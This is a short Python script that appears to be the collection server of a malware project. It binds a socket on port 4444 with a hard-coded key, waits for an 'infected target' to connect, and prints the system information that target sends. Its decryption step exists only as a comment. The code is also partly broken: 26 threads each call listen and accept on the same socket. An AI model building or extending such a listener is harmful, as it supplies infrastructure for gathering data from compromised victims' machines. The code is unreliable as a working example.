from xLib import cryptography
from threading import Thread 
import socket 


# ServerClass
class Server:
    def __init__(self,host,port,key):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.host = host 
        self.port = port 
        self.key = key 


    # Bind Server
    def bind_server(self):
        print("[*]Bind Server on --> {}:{} ".format(self.host,self.port))
        self.sock.bind((self.host,self.port))

    
    # wait for infected target 
    def handle_target(self):
        # Waiting for Client
        self.sock.listen(1)
        # Accept Connection
        client,addr = self.sock.accept()
        # Save System Informations
        self.info = []
        for x in range(0,6):
            # Recveive message and decode
            message = client.recv(4096).decode("utf8")
            # Decrypt message
            # append
            self.info.append(message)
        for element in self.info:
            print(element)
            

        


server = Server("127.0.0.1",4444,"+YI]gq{tGjaT)ESu")
server.bind_server()
for x in range(0,26):
    t = Thread(target=server.handle_target).start()
